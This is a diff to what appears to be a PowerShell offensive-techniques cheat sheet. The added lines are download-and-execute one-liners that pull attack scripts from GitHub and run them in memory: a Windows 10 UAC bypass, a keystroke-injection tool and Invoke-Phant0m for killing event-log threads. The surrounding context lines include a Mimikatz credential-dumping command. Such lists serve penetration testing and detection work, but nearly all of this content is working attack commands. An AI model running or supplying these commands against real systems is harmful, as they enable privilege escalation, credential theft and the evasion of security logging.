@@ -14,6 +14,18 @@ https://www.blackhillsinfosec.com/?p=5831
 
     powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
 
+### Invoke-AppPathBypass
+
+Note: Windows 10 only
+
+Bypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/
+
+    Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass"
+
+At prompt, to test:
+
+    C:\Windows\System32\cmd.exe
+
 ### Obfuscated Powershell
 
 Fancy obfuscation that reaches out to bit.ly/L3g1t to stdout: "SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION"
@@ -65,6 +77,10 @@ Output:
 
 ## Powershell Kits
 
+### Unicorn
+
+https://github.com/trustedsec/unicorn/blob/master/README.md
+
 ### Empire
 
 http://www.powershellempire.com/
@@ -103,11 +119,23 @@ https://github.com/D4Vinci/Dr0p1t-Framework
 
 https://github.com/fdiskyou/PowerOPS
 
-    Copy ([PSObject].Assembly.Location) C:\
+    powershell.exe Copy ([PSObject].Assembly.Location) C:\
 
 Then:
 
-    csc.exe /unsafe /reference:"C:\System.Management.Automation.dll" /reference:System.IO.Compression.dll /out:C:\users\ieuser\desktop\PowerOPS_x64.exe /platform:x64 "C:\C:\Users\IEUser\Downloads\PowerOPS-1.0-beta\PowerOps\*.cs"
+    csc.exe /unsafe /reference:"C:\System.Management.Automation.dll" /reference:System.IO.Compression.dll /out:C:\users\ieuser\desktop\PowerOPS_x64.exe /platform:x64 "C:\Users\IEUser\Downloads\PowerOPS-1.0-beta\PowerOps\*.cs"
+
+### Invoke-AutoIt
+
+https://github.com/byt3bl33d3r/Invoke-AutoIt
+
+    Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/byt3bl33d3r/Invoke-AutoIt/master/Invoke-AutoIt.ps1'); Invoke-AutoIt -WindowTitle "Remote Desktop" -Keys "Rainbow Push-ups""
+
+### Invoke-Phant0m
+
+https://github.com/hlldz/Invoke-Phant0m
+
+    Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://github.com/hlldz/Invoke-Phant0m/blob/master/Invoke-Phant0m.ps1'); Invoke-Phant0m"
 
 # Other
 
